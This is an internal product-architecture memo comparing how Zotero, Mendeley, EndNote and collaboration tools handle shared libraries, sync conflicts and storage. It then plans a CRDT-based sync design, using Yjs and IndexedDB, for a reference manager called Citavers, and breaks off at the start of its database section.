Internal R&D Memo: Architectural Teardown of Zotero Groups & Market Alternatives
Document Type: Competitive Intelligence & Product Architecture Analysis Objective: Deconstruct the collaborative capabilities of Zotero Groups and alternative market solutions to inform the development of our own native collaborative reference management infrastructure.
Architectural Disclaimer: While Zotero's client-side desktop application is open-source (allowing us to inspect the local SQLite database structures), their server-side synchronization logic, load balancing, and exact database schema remain proprietary. Similarly, platforms like Mendeley and EndNote are entirely closed-source. The technical assumptions in this document regarding their backends are derived from observed client-server API interactions, community edge cases, and client-side code analysis. Behaviors may shift with silent server updates.
1. Access Control Logic & Legal Compliance (DMCA)
Zotero’s approach to group typology is not strictly driven by user experience; it is fundamentally designed around copyright law and DMCA (Digital Millennium Copyright Act) safe harbors.
A. The Three-Tier Visibility System
Public Open: Anyone can join.
Architectural Constraint: File sharing (blobs/PDFs) is hard-disabled at the server level.
Our Takeaway: If we implement public groups, we must replicate this strict firewall. Allowing attachments in open groups turns the platform into an illicit file-sharing network (a "Napster for papers"), which carries massive legal liability.
Public Closed: Discoverable, but membership requires approval.
Implementation Detail: Metadata is readable by non-members via web and API, but file endpoints return HTTP 403 Forbidden for non-authenticated users.
Private: Hidden entirely. Unrestricted file sharing.
Opportunity for Our Product: Zotero relies on binary rules (files on/off). We could potentially implement copyright-aware file hashing. If a user uploads an Open Access paper (matching a known DOAJ/Crossref hash), we could theoretically allow it in a Public group, blocking only paywalled hashes. However, this introduces high computational overhead.
2. Database Architecture: "Copy" vs. "Symlink" (The Data Duplication Dilemma)
This is perhaps the most critical architectural decision Zotero made, and one we must evaluate carefully.
The "Independent Copy" Implementation
When a user drags an item from "My Library" to a "Group Library", Zotero duplicates the row in the database. It assigns a completely new Item URI and Key.
The "Why": Zotero prioritizes the immutability of the personal library. If a group admin alters the metadata of a shared paper, the user's personal copy remains untouched.
The "Cost": Total detachment. If the user later realizes they spelled the author's name wrong, fixing it in their personal library does not fix it in the group.
The Word Processor Vulnerability (Edge Case)
Because moving an item creates a new Database ID, citations break. If a user cites an item in MS Word from their personal library, then moves that item to a Group and deletes the personal copy, the Word plugin throws an error because the original Item URI no longer exists.
Strategic Recommendation for Us: We should explore a Symlink / Pointer Architecture. Instead of duplicating the item, dragging to a group could create a pointer. We would need a robust permissions model to determine if group edits propagate back to the personal library.
3. Storage Infrastructure & Quota Attribution (The "Owner Pays" Model)
Storage in collaborative environments is notoriously difficult to calculate. Zotero opted for the most computationally simple logic.
The Quota Logic
Zotero uses an "Owner Pays" model. All attachments (PDFs, images) uploaded to a group, regardless of who uploaded them, are charged against the storage quota of the Group Owner.
Pros: Extremely easy to calculate at the database level (SELECT SUM(file_size) WHERE group_owner_id = X). No complex fractional billing.
Cons (Friction Point): If a well-funded lab creates a group, but the RA (with a 300MB free tier) initiates the group creation, the entire lab is bottlenecked by the RA's quota.
Ownership Transfer Risk: If the Owner deletes their account without transferring ownership, the group becomes orphaned. Storage quotas collapse, and syncing halts abruptly.
Strategic Recommendation for Us: We should implement "Pooled Organization Storage" or "Workspace Storage" independent of individual user accounts.
4. Synchronization Protocols & Conflict Resolution Algorithms
Metadata Syncing (JSON API)
Zotero syncs metadata for free. Their sync engine appears to use a modified Last-Write-Wins (LWW) architecture, paired with a manual conflict resolution UI.
The Limitation: It is not a true real-time CRDT (Conflict-Free Replicated Data Type) system like Google Docs or Figma.
The Edge Case: If User A and User B edit the same item's abstract simultaneously while offline, upon syncing, Zotero throws a "Sync Conflict" modal box, forcing the user to manually select which version to keep. There is no line-by-line merge.
WebDAV Blockade & Security Posture
While individual Zotero users can use personal WebDAV servers for file storage, WebDAV is strictly disabled for Zotero Groups.
The Reasoning: Securely distributing WebDAV credentials to all group members' local clients is a massive security vulnerability.
The Result: Group users must use Zotero's official AWS-backed storage infrastructure, acting as a major monetization funnel.
5. Collaborative Annotation Layer (Zotero 6/7)
Zotero's internal PDF reader with annotation capabilities operates on an overlay system.
Overlay Architecture: Annotations are stored as JSON/SQLite metadata overlays associated with the PDF item, not burned into the PDF binary.
Collaboration Frictions: Because of the lack of real-time CRDT, collaborative annotation is risky. Simultaneous highlighting by multiple users can spawn duplicate annotation files or result in data loss via overwrites.
6. Identified Edge Cases & Vulnerabilities (Opportunities to Outperform)
The Proxy/Paywall Mismatch: Our scraper must automatically strip institutional proxy prefixes (ezproxy., proxy.lib., etc.) and resolve them to the canonical DOI URL before saving to a group database.
Trash Orphans: Items deleted by a member go to the "Group Trash" and continue to consume the Owner's storage quota invisibly. We must implement an auto-purge for Group Trash (e.g., 30 days).
Mobile Caching Uncertainties: iOS/Android apps handle group PDFs via on-demand downloading. We must implement "Pin to Device" functionality for offline persistence.
Mass Deduplication Data Loss: Merging duplicate items in a collaborative group risks overwriting custom notes. We must implement "Note Merging."
7. Comparative Market Analysis: Alternative Collaboration Models
To build a superior product, we must analyze how Zotero’s direct competitors and broader collaborative tools handle shared environments.
A. Mendeley (Elsevier) - The Cloud-Forced Architecture
Mendeley recently transitioned from a local-first SQLite application to the "Mendeley Reference Manager" (an Electron-based, cloud-dependent app).
The Deprecation of Public Groups (Crucial Edge Case): Mendeley abruptly discontinued "Public Groups" a few years ago. Hypothesis: The moderation costs, DMCA takedown requests, and server loads became too expensive. Our Takeaway: Public open groups are a massive moderation liability; we should focus heavily on private/institutional sharing instead.
Storage Obfuscation: Unlike Zotero, the new Mendeley obfuscates its local database cache. Users cannot easily script or backup their group data locally. This creates high vendor lock-in but alienates power users.
Collaboration Model: Private groups allow PDF sharing. However, sync conflicts remain an issue, often resulting in silent overwrites rather than Zotero's explicit warning modals.
B. EndNote (Clarivate) - The Legacy Desktop Approach
EndNote's architecture is fundamentally built for a single user, with collaborative features bolted on via "EndNote Online".
"Share Library" vs. Groups: EndNote allows users to share their entire library (up to 1,000 users) or specific groups. However, it relies heavily on a central sync server.
The "Sync Lock" Vulnerability: Because it lacks modern simultaneous editing protocols, EndNote has been known to employ aggressive locking mechanisms. If the central database is being updated by User A, User B's sync might hang or fail.
Attachment Handling: Syncing large libraries with attachments in EndNote is notoriously slow and prone to timeout errors, a symptom of outdated chunking algorithms for blob storage.
C. Google Docs / Notion - The CRDT/OT Gold Standard
While not reference managers, these platforms define modern user expectations for collaboration.
CRDT & Operational Transformation: They use CRDTs (Conflict-Free Replicated Data Types) or OT to allow true real-time, simultaneous editing.
The Gap in the Market: Currently, no major reference manager uses true CRDTs for metadata or PDF annotation. If two researchers are editing a citation's tags, it’s a race condition.
Our Opportunity: If we can apply CRDT logic to structured bibliographic JSON data, we will be the first "Real-Time Multiplayer Reference Manager."
8. Cross-Industry Collaboration Architectures (Lessons from Non-Domain Platforms)
Looking outside academia, several platforms have solved complex collaborative data management problems. We can adapt their architectural principles to reference management.
A. Git / GitHub (The Distributed Proposal Model)
How it Operates: Git uses a decentralized version control system. Instead of everyone editing the "main" file simultaneously, users create "branches," make changes, and submit "Pull Requests" (PRs) to merge their edits.
The Lesson for Us: Zotero allows any admin to permanently overwrite metadata. We could introduce a "Proposal" or "Suggested Edits" system for shared libraries. If a student corrects metadata in a lab's master bibliography, it doesn't overwrite instantly; it flags the PI to approve the change.
Edge Case Warning: Full Git-style branching is historically too complex for non-engineers. The UX must hide the complexity of "merging" behind simple "Approve/Reject" buttons.
B. Figma (Multiplayer Spatial Presence)
How it Operates: Figma allows dozens of designers to work on the same canvas in real-time, utilizing WebGL and CRDTs to sync object-level changes instantly. Users see each other's mouse cursors, providing "spatial presence."
The Lesson for Us: When co-authors are doing a literature review, seeing where your colleague is currently reading or highlighting inside a PDF would eliminate duplicate effort. A "Live Session" feature inside the PDF reader could be revolutionary.
Edge Case Warning: Maintaining active WebSockets for cursor tracking is computationally expensive and drains server resources quickly. It should only be active when users are explicitly viewing the same PDF.
C. Obsidian / Logseq (Local-First Sync with Merging)
How it Operates: Obsidian operates entirely on local text files (Markdown). Its built-in sync engine merges block-level changes gracefully when two devices come back online, prioritizing data ownership over cloud dependency.
The Lesson for Us: Mendeley went full-cloud; Zotero is local-first but has clunky conflict resolution. We should adopt a strictly Local-First Architecture where the database lives on the machine, ensuring researchers can work entirely offline in the field or on airplanes, with a silent, block-level merge algorithm when they reconnect.
D. Linear / Slack (Contextual Threaded Communication)
How it Operates: In Linear (an issue tracker), every task has a dedicated, threaded chat layer. Discussions happen on the object itself rather than in a disconnected Slack channel.
The Lesson for Us: Zotero relies on static "Notes" for communication. If User A highlights a paragraph and asks, "Should we cite this?", User B has no way to reply directly to that highlight. We must build a Threaded Commenting Layer attached to specific annotations, eliminating the need for researchers to switch context to email or WhatsApp to discuss a paper.
9. Deep Dive: The Contextual Discussion Layer (Cost/Benefit Analysis)
Transforming the reference manager from a static archive into an active communication hub requires implementing a "Contextual Discussion Layer." This means embedding chat capabilities directly onto specific data points (e.g., a specific PDF highlight, or the abstract of a specific paper).
While highly desired by users, this architecture introduces profound engineering and UX complexities.
A. The Benefits (Strategic Advantages)
Elimination of Context Switching: Researchers currently share a paper via Zotero, but discuss it via Slack/Email ("Look at page 4 of the Smith paper..."). A threaded comment directly on the highlight eliminates this friction.
Preserving the "Why": Standard reference managers capture what was read. Contextual threads capture why a decision was made. (e.g., A thread concluding: "Let's exclude this paper from the meta-analysis due to its small sample size."). This is invaluable for lab onboarding and longitudinal research integrity.
Granular Engagement: Discussions can be scoped. A lab can have a high-level thread on the paper itself ("Should we read this?"), and micro-threads on specific PDF annotations ("Is this formula correct?").
B. The Technical & Financial Costs (Risks)
Explosion of Database Rows: Zotero's database is relatively small because it only stores static metadata. A threaded chat system generates millions of micro-transactions. Our database schema must transition from simple relational tables to handling high-velocity, nested graph structures (e.g., Comment_ID -> Parent_Comment_ID -> Annotation_ID -> PDF_ID).
Real-Time Transport Overhead: Static syncing (REST API calls every few minutes) is cheap. Threaded discussions expect instant delivery. Implementing WebSockets or Server-Sent Events (SSE) across a distributed desktop application dramatically increases server operational costs.
C. Crucial Edge Cases & UX Hazards
The "Export/Lock-in" Dilemma (Critical Vulnerability): This is the hardest problem. Standard PDF specifications (ISO 32000) support basic sticky notes, but they do not natively support deeply nested, multi-author modern chat threads. If a user wants to export a heavily discussed PDF to share with an external reviewer, how do we export it?
Option 1: Flatten the thread into a single, ugly, massive standard PDF sticky note (loss of UX).
Option 2: Force the external reviewer to use our web app via a sharing link (creates high vendor lock-in, which academics deeply resent).
Notification Fatigue: If 10 researchers are in a group, and 3 are actively debating a PDF highlight, the other 7 will be bombarded with sync updates. The system must implement a robust routing engine: @mentions, "Mute Thread", and "Resolve" functionalities (like Google Docs) are not optional; they are mandatory to prevent users from abandoning the feature.
UI Clutter (Canvas Overcrowding): A PDF with 50 highlights is hard to read. A PDF with 50 highlights, each containing a 10-message expanded chat thread, is unusable. The UI must aggressively collapse resolved threads into the margins, deploying a highly responsive sidebar architecture.
10. Architectural Paradigm: Cloud-First vs. Local-First (IndexedDB)
The fundamental difference between platforms like Mendeley (Cloud-First) and Zotero (Local-First via SQLite) dictates user onboarding, data ownership, and offline capabilities. Our platform currently utilizes a hybrid approach: IndexedDB for unauthenticated local storage, transitioning to Cloud Sync upon authentication. ### A. The Cloud-First Approach (e.g., Mendeley Reference Manager)
Architecture: The application is essentially a thin client. Every action requires server validation.
Pros: Single source of truth. Real-time collaboration is easier to implement because there is no local database conflict to resolve.
Cons (Friction): High barrier to entry. Users must create an account to do anything. If the server goes down, or the user is offline (e.g., on a flight), the application becomes a brick. Vendor lock-in is absolute.
B. The Local-First Approach (Our IndexedDB Implementation)
Architecture: The application reads and writes to the browser's IndexedDB natively. Syncing to the cloud is a background process that happens only if authenticated.
Pros (Strategic Advantage): Zero-friction onboarding. A user can open the app, drop a PDF, and start extracting metadata immediately without an account. It respects data ownership and provides instant UI feedback (no network latency for local reads/writes).
Cons & Critical Edge Cases:
Browser Cache Eviction (High Risk): IndexedDB is not permanent storage unless explicit persistent permissions are granted. If a user does not log in, and their hard drive fills up, browsers (especially Safari, which heavily restricts IndexedDB after 7 days of inactivity) will silently purge the database. Unauthenticated users could lose all stored PDFs without warning.
State Reconciliation: Transitioning a user from a deeply populated local IndexedDB state to a Cloud state (upon their first login) requires a flawless merging algorithm to prevent overwriting cloud data or losing local data.
11. Pragmatic Evaluation of Our Architecture (Citavers)
Based on internal R&D cycles, our architecture—IndexedDB + Cloud Sync + External Default PDF Viewer—is not a compromise; it is a highly strategic, flexible foundation when optimized correctly.
A. The PDF.js Post-Mortem (Validating Section 9)
We attempted to integrate PDF.js to build an internal PDF viewer. After months of R&D, we sunsetted the feature.
The Reality Check: Rendering modern PDFs (which often contain complex vectorized charts, erratic OCR text layers, and massive embedded fonts) via Canvas/HTML5 creates enormous technical debt. The performance lag on lower-end devices and the maintenance overhead of managing rendering bugs far outweighed the benefits.
The Pragmatic Decision: By relying on the browser's native PDF viewer (window.open(pdfUrl)), we offload a massive computational burden to Google/Apple engineers. We lose DOM control over the PDF text, but we gain unmatched rendering speed and zero-maintenance reliability.
B. The Pivot: Metadata-Level Contextual Discussion (The Linear/Notion Approach)
Since we cannot inject a discussion thread inside the PDF binary, we must shift the "Contextual Discussion Layer" to the Metadata Layer (Dashboard & Detail Views).
Looking at the current Citavers UI (dark mode, highly structured metadata, rich color-coded tags like #Process Control, #Q-Learning), we have an immense UX advantage. The 1440p resolution provides ample horizontal "white space" (empty margins) that we can aggressively utilize.
How it Operates (The Architectural Pivot):
The Drawer/Side-Peek UI: Instead of a chat box floating over a PDF, clicking the Notes button (or a new Discuss icon) on a paper card slides out a persistent right-hand drawer (similar to Linear's issue drawer or Notion's side-peek).
Anchor Points: Discussions are anchored to the Entity (the Paper ID) or specific Metadata components.
Example: A user can start a thread attached to the #Literatur Örneği tag of a specific paper.
Example: A user highlights a section of their own Markdown notes in the dashboard and starts a thread: "Does this methodology align with our lab's standards?"
Database Simplicity: Because the chat is tied to our structured database (IndexedDB/Cloud) and not to arbitrary X/Y coordinates on a PDF page, the database schema remains infinitely cleaner and more stable.
Pros of this Pivot:
Zero PDF Export Issues: We bypass the impossible "PDF Export/Lock-in dilemma" mentioned in Section 9. PDF files remain pristine and universally shareable. Discussions live strictly in our app ecosystem.
Rapid UI Execution: Utilizing the empty margins on 1440p/1080p screens for a sliding discussion drawer maximizes screen real estate without cluttering the main list view.
Hybrid-DB Compatibility: A text-based discussion thread syncs effortlessly via CRDTs between IndexedDB (local offline) and Cloud, unlike complex PDF annotation coordinate data.
Cons (The UX Trade-off):
Users cannot visually point to "Figure 3" inside the app. They must reference it textually in the thread ("Check out the surge tank graph on page 5"). Verdict: Acceptable trade-off for system stability.
12. Deep Dive: Next-Generation Synchronization (Beyond LWW to CRDT/OT)
Currently, Citavers relies on a simple Last-Write-Wins (LWW) algorithm for its IndexedDB-to-Cloud sync. If two users edit the same paper's tags offline, whoever syncs last completely overwrites the other's changes. To build a true "Real-Time Collaborative Workspace" and support the "Contextual Discussion Drawer" proposed in Section 11, we must migrate to a state-of-the-art synchronization engine.
There are two primary paradigms in the market: Operational Transformation (OT) and Conflict-Free Replicated Data Types (CRDT).
A. Operational Transformation (OT) - The Google Docs Model
How it Works: Instead of sending the final state of a document, clients send operations (e.g., insert "a" at index 5). A central server receives operations from User A and User B, mathematically transforms them so they don't clash, and broadcasts the corrected operations back to all clients.
The "Why Not Us" Factor: OT strictly requires a central, authoritative server to sequence the operations. Because Citavers is designed to work Local-First via IndexedDB (where users might work offline for days), OT breaks down. If a user generates thousands of offline operations, transforming them against a server that has moved on for 3 days is computationally disastrous.
B. CRDTs (Conflict-Free Replicated Data Types) - The Notion / Local-First Model
CRDTs are data structures mathematically guaranteed to converge to the same state on all devices, regardless of the order in which network packets arrive or how long a user was offline. This is the exact architecture Citavers needs for its IndexedDB-first approach.
How CRDTs Work (Deep Technical Mechanics):
State-based (CvRDT) vs. Operation-based (CmRDT): For a web application like ours, we will likely utilize Operation-based CRDTs. Instead of syncing the entire JSON object every time, the client sends only commutative operations. Because the operations are commutative, order does not matter; if User A's packets are delayed by a bad network, they will still merge correctly with User B's edits.
Logical Clocks (Vector Clocks): CRDTs abandon "Wall-Clock Time" (which relies on system clocks that are notoriously out of sync). Instead, they assign a combination of a Client_ID and an incrementing integer (e.g., ClientA: 5) to every single keystroke. This guarantees absolute deterministic merging without relying on timestamps.
The "Tombstone" Imperative (The Deletion Edge Case): In a CRDT, you cannot execute a standard SQL DELETE. If User A deletes a tag offline, and User B modifies that tag offline, the system needs to know the tag existed to resolve the conflict. Instead of deleting, data is marked with a "Tombstone" (deleted: true). It becomes invisible in the UI but remains in the database.
C. Open-Source Frameworks for Citavers Implementation
Building a custom CRDT is mathematically perilous. We must adopt a battle-tested open-source framework, but configure it strictly for our pragmatic needs.
Yjs (The Primary Candidate): * Overview: Yjs is a highly performant CRDT for JavaScript. It supports complex nested data types (Y.Map, Y.Array) which perfectly map to our bibliographic JSON structures.
The y-indexeddb Advantage: Yjs has a native provider for IndexedDB. When our unauthenticated users use Citavers, Yjs manages the state locally. When they log in, y-websocket seamlessly streams the accumulated local operations to the cloud server, resolving state divergence automatically.
The "Awareness" Exclusion (Avoiding Over-engineering): Yjs comes with a y-protocols/awareness module designed for "Cursor Tracking" and "User Presence" (e.g., showing who is online). We must explicitly disable or avoid implementing this module. Maintaining active WebSockets merely to broadcast X/Y cursor coordinates is a vanity metric that will unnecessarily inflate our AWS/server costs and client-side CPU usage. We only need Yjs for data synchronization.
Automerge:
Overview: Driven by Ink & Switch (pioneers of Local-First software), Automerge acts like a Git repository for JSON data. Its core is written in Rust (via WASM).
Fit for Citavers: Exceptional for structured metadata (Tags, Authors). However, it historically consumes more memory than Yjs. Given our need for a lightweight browser experience, Automerge's WASM footprint might be too heavy for users with hundreds of papers, though its JSON handling is superior.
RxDB / WatermelonDB (The Hybrid Alternatives):
Overview: These are offline-first databases that utilize standard relational/NoSQL paradigms but offer robust conflict resolution hooks (often falling back to LWW or custom resolvers).
Verdict: If implementing a full CRDT like Yjs proves too complex for the current data schema, moving from raw IndexedDB to RxDB provides a safer, intermediate step that still dramatically improves offline stability over basic LWW.
D. The Edge Cases & Risks of CRDTs (What to Watch Out For)
Migrating to a CRDT introduces specific challenges that our engineering team must anticipate:
The "Array Interleaving" Phenomenon (Critical Tagging Edge Case): CRDTs handle sequences (like text) brilliantly, but simple Arrays (like our [Tags] array) can behave unexpectedly.
Example: If User A offline adds the tag "#Bio" at index 0, and User B offline adds "#Tech" at index 0, a standard sequence CRDT might merge them as ["#Bio", "#Tech", ...]. If this happens inside a string of text, it creates gibberish (interleaving).
The Solution: For tags and author lists, we must use a CRDT Set (LWW-Element-Set or OR-Set) rather than a standard Sequence/Array. Sets guarantee uniqueness and prevent order-based interleaving bugs.
13. Deep Dive: The First-Time Authentication Merge (State Reconciliation Strategy)
The most dangerous moment in the Citavers user journey is the "First-Time Login". A user might have utilized the platform unauthenticated for weeks, accumulating 50 papers in their local IndexedDB. When they finally click "Login" and authenticate, the system must merge their local state with the Cloud state.
CRDTs are powerful, but they are not magic. If we do not explicitly define how entities are recognized during this initial collision, we risk massive data corruption or duplication.
A. The Core Scenarios
Scenario 1 (New User Registration): The user's cloud database is empty. This is trivial. The system simply uploads the entire local CRDT document to the cloud as the new baseline.
Scenario 2 (Existing User, New Device): The user has 500 papers in the cloud. They open a library computer, use Citavers locally (without logging in), add 2 papers, and then log in. The system must append the 2 local papers to the 500 cloud papers without overwriting the cloud.
Scenario 3 (The Collision / Edge Case): The user has 500 papers in the cloud. Locally, they added 2 new papers, but they also added 1 paper that already exists in the cloud.
B. The "Deterministic ID" Imperative (Avoiding Duplication)
CRDTs track objects based on their IDs (Keys). If the user adds a paper locally, the system typically generates a random UUIDv4 (e.g., id: 123-abc). If that same paper already exists in the cloud with id: 999-xyz, the CRDT merge will fail to recognize they are the same paper and will create a duplicate in the UI.
The Solution (Client-Side Hashing): We cannot rely on random UUIDs for primary entities during the unauthenticated phase. Instead, we must use Deterministic Identifiers.
If the user adds a paper via DOI, the internal ID should be a hash of the DOI (e.g., hash("10.1038/s41586")).
When the local state and cloud state merge, the CRDT will recognize the identical hashes. It will correctly merge the tags/notes of the local version with the cloud version, rather than creating two identical papers.
Uncertainty Warning: What if a user manually adds a paper without a DOI? We must implement a secondary fallback hash (e.g., hash(lowercase(Title) + lowercase(Author1))) to prevent duplications, though this is never 100% foolproof.
C. The Group Collision Dilemma (Entity vs. Context Separation)
The Engineering Challenge: As identified earlier, using a Deterministic ID solves the duplication problem for a single user merging their own states. However, what happens in a Shared Collaborative Workspace? If User A and User B both independently add the exact same paper (same DOI hash) to a shared group, the CRDT will flawlessly merge them because the IDs match.
The Problem: Is merging them desirable? Yes and No.
Yes: We want the core bibliographic data (Title, Authors) to merge to prevent the Zotero duplication flaw.
No: We do not want User A's personal tags (e.g., #urgent-read) to forcefully merge and overwrite/interleave with User B's tags (e.g., #ignore-bad-methodology).
The Solution - The "Entity vs. Context" Architecture: To prevent CRDTs from inappropriately merging personal context within a shared workspace, we must construct a Composite ID / Relational Graph within the CRDT structure:
The Core Entity (paper:doi_hash): This CRDT node stores only global, immutable metadata (Title, Authors, Year, Abstract). If User A and B both add it to the group, the CRDT merges them safely. There are no duplicates in the group, and Word citations will never break (solving Zotero's flaw outlined in Section 2) because the core ID remains identical regardless of where the paper is moved.
The Contextual Node (meta:doi_hash:workspace_id or meta:doi_hash:user_id): This is a separate CRDT object pointing to the Core Entity. It stores the tags, ratings, and contextual discussion threads.
Result: By splitting the ID strategy, Citavers guarantees that a single paper is never duplicated in the database (saving storage and protecting citations), while mathematically isolating personal notes from shared group discussions within the sync engine.
D. The Intentional Sharing Paradox (Overcoming Context Isolation)
The Engineering Challenge: The architecture established in 13-C successfully isolates User A's personal tags/notes from User B's to prevent data corruption. However, this creates a Collaboration Paradox: What if User A and User B want to deliberately share their tags, ratings, and notes with the group? The strict meta:doi_hash:user_id isolation prevents intentional collaboration.
To solve this without breaking the foundational isolation rules, we must evaluate two distinct architectural approaches for data promotion.
1. Sym-link (Live Pointer) Architecture vs. Explicit Copy (Snapshot)
When a user decides to "share" a personal note with the group, the database can handle this in two ways:
Approach A: The Sym-link (Live-Linking)
How it works: The group's shared context node creates a pointer (sym-link) referencing the user's private meta:doi_hash:user_id node.
The Danger (Privacy Vulnerability): If User A shares a note with the group, and a week later forgets it is shared, they might add a highly sensitive, private comment to that note (e.g., "This methodology is terrible, the PI is wrong"). Because it is sym-linked, this private thought instantly syncs to the entire lab group.
Verdict: While Sym-links are perfect for Core Entities (so a paper's title only exists once in the DB and citations don't break), they are highly dangerous for Contextual Nodes (Notes/Tags) because they violate user expectations of privacy over time.
Approach B: Explicit Promotion (Copy-by-Value / Snapshotting)
How it works: When a user clicks "Share with Group", the system executes a hard CRDT copy. It extracts the JSON value from meta:doi_hash:user_id at that exact timestamp and inserts it into meta:doi_hash:workspace_id.
The Safety Benefit: It acts exactly like a "Pull Request" in Git or attaching a file to an email. The user shares a snapshot of their thought at that moment. Subsequent edits to their private note remain strictly private.
2. The Divergence Edge Case & UX Solution
By choosing the Explicit Promotion (Snapshot) approach, we inherently create a "Divergence" edge case:
Scenario: User A "promotes" their note to the shared workspace. The note is now copied. User A then edits the note in their personal workspace. The shared version does not update because they are now two distinct CRDT objects. The two notes have "diverged."
UX Solution (Crucial for Trust): We cannot leave the user guessing which version is which. The Citavers UI must implement specific indicators:
Visual Separation: The Drawer UI must clearly demarcate "My Private Notes" vs. "Shared Group Notes" using distinct background colors or lock/globe icons.
The "Out of Sync" Badge: If the system detects that the updated_at timestamp of the personal note is newer than the shared snapshot, the UI should display a subtle badge next to the private note: "Modified since last share." with an adjacent button: [Update Shared Version].
Diff Avoidance: Do not build complex line-by-line "Merge/Diff" UIs for notes. It over-complicates the MVP. If a user clicks [Update Shared Version], it simply overwrites the shared snapshot (or adds it as a new timestamped comment in the Discussion Drawer).
3. Organized Implementation Plan for Intentional Sharing
To implement this seamlessly in Citavers without overwhelming the user or the database, we must follow this structured plan:
Step 1 (Tags - Simple Copy): Tags (#To-Read) are atomic strings. When a user explicitly applies a personal tag to a group workspace, it is a simple Copy-by-Value into the shared array. No divergence tracking is needed for strings.
Step 2 (Notes - The "Promote to Drawer" Action): Personal notes should not just copy silently to a shared note field. Instead, they should be "Promoted" directly into the Contextual Discussion Drawer (as designed in Section 11-B).
Workflow: User clicks [Share Note]. The note's content is injected as a new, timestamped message from User A into the group's Discussion Drawer for that paper.
Why this is elegant: It inherently solves the Divergence problem. A chat message is historically understood as a snapshot in time. Users do not expect a chat message from yesterday to magically update if they change their private notes today.
14. Deep Dive: CRDT Garbage Collection & State Snapshotting
Adopting a CRDT architecture solves the Last-Write-Wins (LWW) conflict problem, but introduces a new, equally dangerous threat. Because CRDTs are "Append-Only" (they only add data, never truly delete it), we must build robust mechanisms to prevent the database from suffocating under its own history.
To understand this, we must break down the core concepts into easily understandable mechanics.
A. The "Metadata Bloat" Phenomenon (The Video Recording Analogy)
The Concept: In a standard database, if you type "Hello", it saves the word "Hello". In a CRDT, it doesn't save the word; it saves a mathematical Operation Log of exactly how you typed it.
The Analogy: Think of a normal database like a Photograph (it just shows the final state). Think of a CRDT like a Video Recording of you typing. If you type a 50-character note, delete half of it, and rewrite it, the CRDT "video" remembers every single backspace and keystroke.
The Threat: Over months of use, this "video recording" of a simple text note can balloon from 2KB to 200KB. This is "Metadata Bloat". If left unchecked, it will crash the user's browser (IndexedDB limits) and drastically increase your server bandwidth costs.
B. State Snapshotting (Squashing the History)
The Concept: We cannot let the "video recording" run forever. We must periodically pause it, look at the final result, take a "Photograph" (Snapshot), and throw away the messy video history.
How it Works (The Flattening): In Yjs, this is done via a function called Y.encodeStateAsUpdate(). The backend takes the massive list of 10,000 operations, calculates the final absolute state, and saves it as a single, compressed binary blob.
The Benefit: When a user logs in on a new device, the server doesn't send them 10,000 operations. It sends the single, tiny Snapshot photograph. Once the client has the snapshot, it only needs to download the new operations (deltas) that happened after the snapshot was taken.
C. Tombstone Pruning & The "30-Day Rule" (Dealing with Deletions)
The Concept of a Tombstone: In a CRDT, you cannot permanently delete a tag (e.g., #Bad-Paper) immediately. If you do, an offline user might sync later, not realize it was deleted, and accidentally recreate it. Instead, the system leaves an invisible marker saying "This item is dead". This is a Tombstone.
The Problem: Even after Snapshotting (flattening the text), Tombstones remain in the database. If a user deletes 1,000 tags over a year, they have 1,000 invisible Tombstones slowing down the app.
The Solution (Pruning): We must permanently destroy these Tombstones to reclaim hard drive space. But we cannot do it instantly. We must establish a "Time-to-Live" (TTL) window.
The 30-Day Rule: The industry standard is 30 Days. If a Tombstone has existed for 30 days, we assume every user in the collaborative group has synced their device at least once and knows the item is dead. The server's Garbage Collector then safely and permanently deletes (prunes) the Tombstone from the database.
D. Full State Reconciliation (The Fallback Edge Case)
The Scenario: What happens if a researcher goes on a field expedition, works entirely offline for 3 months, and then connects to Citavers?
The Problem: Their laptop contains operations trying to modify Tombstones that the server permanently pruned 2 months ago (due to the 30-day rule). The local "video recording" and the server's "photograph" are now mathematically incompatible.
The Mechanism (The Nuclear Option): The server detects that the user's timestamp (State Vector) is dangerously outdated. It rejects the normal sync process. Instead, it forces a "Full State Reconciliation".
The Result: The server commands the client to completely wipe its local y-indexeddb and re-download the server's master Snapshot from scratch. Warning: Any offline edits the researcher made to those heavily pruned areas during the 3 months are permanently lost. This is a harsh but necessary trade-off to keep the database fast for the 99% of regular users.
15. Tech Stack Mapping & Cost Infrastructure (Citavers Context)
Transitioning from theoretical CRDT concepts to a production-ready system requires explicitly mapping these mechanisms to the Citavers technology stack: Vanilla JS (Zero Build), Express.js (Node.js on Railway), WebSockets, and Neon.db (Serverless PostgreSQL).
Crucially, we must evaluate how this architecture impacts your monthly cloud billing.
A. Frontend: Zero-Build Vanilla JS & Web Workers
Implementation: To maintain your "zero build" philosophy (no Webpack/Vite), Yjs can be imported natively using ES Modules (<script type="module">) via CDNs like esm.sh/yjs or unpkg.com.
Preventing Browser Freezes (Local Garbage Collection): Because unauthenticated users never hit the Express server, their local IndexedDB will bloat indefinitely. You must implement a native Vanilla JS Web Worker.
How it works: Every 10th time the user opens the app, the background worker quietly reads the IndexedDB, runs the Snapshotting (Y.encodeStateAsUpdate()), and overwrites the bloated history, keeping the browser lightning fast without blocking the main UI thread.
B. Transport Layer: Express.js & WebSockets on Railway (Cost Analysis)
To enable real-time collaboration (The Discussion Drawer) and continuous Yjs delta syncing, WebSockets (ws or Socket.io) on your Express server are mandatory. However, this introduces significant infrastructure nuances on Railway.
The Railway Cost Reality: Railway bills based on CPU and RAM execution time. A standard REST API sleeps or uses minimal RAM between requests. WebSockets, however, hold connections open. If 1,000 users leave Citavers open in a background tab, your Express container must hold 1,000 active socket instances in RAM, meaning your server never truly scales down.
Ping/Pong Heartbeats (The Necessity): PaaS load balancers (like Railway's) violently kill WebSocket connections if no data is sent for ~30-55 seconds (idle timeout).
Implementation: Your Vanilla JS client and Express server must send a tiny, empty payload (Ping -> Pong) every 20 seconds.
Cost Impact: While bandwidth is negligible, this constant pinging guarantees the Node.js event loop is always active, ensuring your Railway container is billed at a steady rate.
Exponential Backoff (The Cost Saver): When Railway restarts your container (during a deployment or crash), 1,000 clients will instantly try to reconnect at exactly the same millisecond. This is the "Thundering Herd" problem, and it will spike your CPU to 100%, causing the server to crash repeatedly.
Implementation: The Vanilla JS client must catch the onclose event and reconnect with Exponential Backoff (retry in 1s, then 2s, 4s, 8s, plus a random jitter of Math.random()).
Cost Impact: This prevents catastrophic CPU billing spikes and prevents Railway from aggressively auto-scaling (and charging you for) unnecessary duplicate containers during a reconnect storm.
C. Database Layer: Neon.db (Serverless Postgres) Cost & Implementation
Storing CRDTs in a relational database requires a highly specific schema design.
